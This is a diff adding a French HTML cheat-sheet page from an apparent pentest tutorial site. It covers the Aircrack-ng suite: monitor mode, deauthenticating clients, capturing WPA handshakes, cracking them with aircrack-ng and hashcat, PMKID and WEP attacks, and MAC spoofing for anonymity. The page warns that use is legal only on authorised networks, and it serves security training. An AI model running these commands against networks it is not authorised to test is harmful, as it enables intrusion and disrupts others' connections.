@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Aircrack-ng — PenTest Hub</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<nav class="navbar">
+  <div class="navbar-brand"><a href="../index.html" style="color:inherit;"><span class="bracket">[</span>PenTest Hub<span class="bracket">]</span></a></div>
+  <div class="navbar-nav">
+    <a href="../index.html">Dashboard</a>
+    <a href="nmap.html">Nmap</a>
+    <a href="sqlmap.html">SQLMap</a>
+    <a href="john.html">John</a>
+    <a href="google-dorks.html">Dorks</a>
+    <a href="osint.html">OSINT</a>
+    <a href="netcat.html">Netcat</a>
+  </div>
+</nav>
+
+<div class="tool-page">
+  <a href="../index.html" class="back-btn">← Retour au Hub</a>
+
+  <div class="tool-page-header">
+    <div class="tool-page-icon">📡</div>
+    <div>
+      <div class="tool-page-title">Aircrack-ng Suite</div>
+      <div class="tool-page-subtitle">Audit WiFi — Capture WPA, cracking, injection, déauthentification</div>
+      <div class="tool-page-meta">
+        <span class="badge badge-purple">Wireless</span>
+        <span class="badge badge-red">WPA/WPA2</span>
+        <span class="badge badge-orange">802.11</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="info-box warning">
+    <span class="info-box-icon">⚠️</span>
+    <div class="info-box-text">Testez uniquement sur des réseaux WiFi dont vous êtes propriétaire ou pour lesquels vous avez une autorisation explicite. Les tests sur des réseaux tiers sont illégaux.</div>
+  </div>
+
+  <h2 class="section-h">📦 Installation</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Installation</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Kali Linux (préinstallé)</span>
+aircrack-ng --version
+
+<span class="cmd-comment"># Debian/Ubuntu</span>
+sudo apt install aircrack-ng
+
+<span class="cmd-comment"># Outils de la suite</span>
+<span class="cmd-success">airmon-ng</span>   — Mode monitor
+<span class="cmd-success">airodump-ng</span> — Capture paquets
+<span class="cmd-success">aireplay-ng</span> — Injection de paquets
+<span class="cmd-success">aircrack-ng</span> — Cracking WEP/WPA
+<span class="cmd-success">airdecap-ng</span> — Déchiffrer les captures
+<span class="cmd-success">airbase-ng</span>  — Faux AP</code></pre>
+  </div>
+
+  <h2 class="section-h">📋 Workflow WPA Handshake</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Étape 1 — Mode Monitor</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Lister les interfaces WiFi</span>
+iwconfig
+ip link show
+
+<span class="cmd-comment"># Activer le mode monitor</span>
+sudo airmon-ng start <span class="cmd-value">wlan0</span>
+<span class="cmd-comment"># L'interface devient wlan0mon</span>
+
+<span class="cmd-comment"># Tuer les processus qui interfèrent</span>
+sudo airmon-ng check kill
+
+<span class="cmd-comment"># Vérifier le mode monitor</span>
+iwconfig wlan0mon</code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Étape 2 — Scanner les réseaux</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Scanner tous les réseaux environnants</span>
+sudo airodump-ng <span class="cmd-value">wlan0mon</span>
+
+<span class="cmd-comment"># Filtrer sur un canal et BSSID spécifique</span>
+sudo airodump-ng <span class="cmd-flag">-c 6 --bssid</span> <span class="cmd-value">AA:BB:CC:DD:EE:FF</span> <span class="cmd-flag">-w</span> <span class="cmd-value">capture</span> <span class="cmd-value">wlan0mon</span>
+<span class="cmd-comment"># -c = canal, --bssid = MAC du routeur, -w = fichier de sortie</span></code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Étape 3 — Capturer le handshake WPA</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Dans un autre terminal — déauthentifier un client (force reconnexion)</span>
+sudo aireplay-ng <span class="cmd-flag">--deauth 10 -a</span> <span class="cmd-value">AA:BB:CC:DD:EE:FF</span> <span class="cmd-flag">-c</span> <span class="cmd-value">CLIENT_MAC</span> <span class="cmd-value">wlan0mon</span>
+<span class="cmd-comment"># -a = BSSID routeur, -c = MAC client connecté, 10 = nombre de paquets</span>
+
+<span class="cmd-comment"># Attendre le message "WPA handshake: AA:BB:CC:DD:EE:FF" dans airodump-ng</span>
+
+<span class="cmd-comment"># Vérifier que le handshake est valide</span>
+aircrack-ng <span class="cmd-value">capture-01.cap</span></code></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">Étape 4 — Cracker le mot de passe</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># Avec aircrack-ng (CPU)</span>
+aircrack-ng <span class="cmd-flag">-a 2 -b</span> <span class="cmd-value">AA:BB:CC:DD:EE:FF</span> <span class="cmd-flag">-w</span> <span class="cmd-value">/usr/share/wordlists/rockyou.txt</span> <span class="cmd-value">capture-01.cap</span>
+
+<span class="cmd-comment"># Convertir pour Hashcat (GPU — beaucoup plus rapide)</span>
+hcxpcapngtool <span class="cmd-value">capture-01.cap</span> <span class="cmd-flag">-o</span> <span class="cmd-value">hash.hc22000</span>
+hashcat <span class="cmd-flag">-m 22000 -a 0</span> <span class="cmd-value">hash.hc22000</span> <span class="cmd-value">/usr/share/wordlists/rockyou.txt</span>
+
+<span class="cmd-comment"># Alternative ancienne format</span>
+cap2hccapx <span class="cmd-value">capture-01.cap</span> <span class="cmd-value">capture.hccapx</span>
+hashcat <span class="cmd-flag">-m 2500 -a 0</span> <span class="cmd-value">capture.hccapx</span> <span class="cmd-value">rockyou.txt</span>
+
+<span class="cmd-comment"># Désactiver le mode monitor</span>
+sudo airmon-ng stop <span class="cmd-value">wlan0mon</span></code></pre>
+  </div>
+
+  <h2 class="section-h">🔧 Attaques supplémentaires</h2>
+  <div class="code-block">
+    <div class="code-block-header"><span class="code-block-title">PMKID Attack & Evil Twin</span><button class="code-block-copy">⎘ Copier</button></div>
+    <pre><code><span class="cmd-comment"># PMKID Attack (sans handshake complet)</span>
+sudo hcxdumptool <span class="cmd-flag">-i wlan0mon -o</span> <span class="cmd-value">pmkid.pcapng</span> <span class="cmd-flag">--enable_status=1</span>
+hcxpcapngtool <span class="cmd-value">pmkid.pcapng</span> <span class="cmd-flag">-o</span> <span class="cmd-value">hash.hc22000</span>
+hashcat <span class="cmd-flag">-m 22000</span> <span class="cmd-value">hash.hc22000</span> <span class="cmd-value">rockyou.txt</span>
+
+<span class="cmd-comment"># WEP cracking (réseau très ancien)</span>
+<span class="cmd-comment"># Capturer des IVs</span>
+airodump-ng <span class="cmd-flag">-c 6 --bssid</span> <span class="cmd-value">BSSID</span> <span class="cmd-flag">-w wep_capture</span> wlan0mon
+<span class="cmd-comment"># Injection ARP replay</span>
+aireplay-ng <span class="cmd-flag">--arpreplay -b</span> <span class="cmd-value">BSSID</span> wlan0mon
+<span class="cmd-comment"># Cracker (besoin de ~100000 IVs)</span>
+aircrack-ng <span class="cmd-value">wep_capture-01.cap</span>
+
+<span class="cmd-comment"># Changer la MAC address (anonymat)</span>
+sudo ip link set wlan0 down
+sudo macchanger <span class="cmd-flag">-r</span> wlan0   <span class="cmd-comment"># MAC aléatoire</span>
+sudo ip link set wlan0 up</code></pre>
+  </div>
+
+</div>
+
+<footer class="footer"><span>[PenTest Hub]</span> — Usage légal uniquement | © Steveny</footer>
+<div id="toast" class="toast"></div>
+<script src="../js/main.js"></script>
+</body>
+</html>
